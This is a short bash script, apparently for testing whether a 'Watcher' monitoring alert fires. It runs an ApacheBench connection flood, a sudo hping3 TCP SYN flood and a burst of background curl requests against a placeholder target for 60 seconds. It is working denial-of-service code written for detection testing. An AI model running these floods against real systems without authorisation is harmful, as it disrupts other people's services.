#!/bin/bash
TARGET_IP="Your_IP"

echo "Starting DDoS attack to trigger Watcher alert..."

# Phase 1: High connection flood
echo "Phase 1: High connection attack"
ab -n 3000 -c 150 -t 45 http://$TARGET_IP/ &
AB_PID=$!

# Phase 2: TCP SYN flood (requires sudo)
echo "Phase 2: TCP SYN flood"
sudo hping3 -S -p 80 -i u10000 $TARGET_IP &
HPING_PID=$!

# Phase 3: Sustained curl requests
echo "Phase 3: Sustained requests"
for i in {1..100}; do
    curl -s http://$TARGET_IP > /dev/null &
    sleep 0.05
done

echo "Attack running for 60 seconds..."
sleep 60

# Cleanup
kill $AB_PID 2>/dev/null
sudo kill $HPING_PID 2>/dev/null

echo "Attack completed. Check Watcher alerts!"
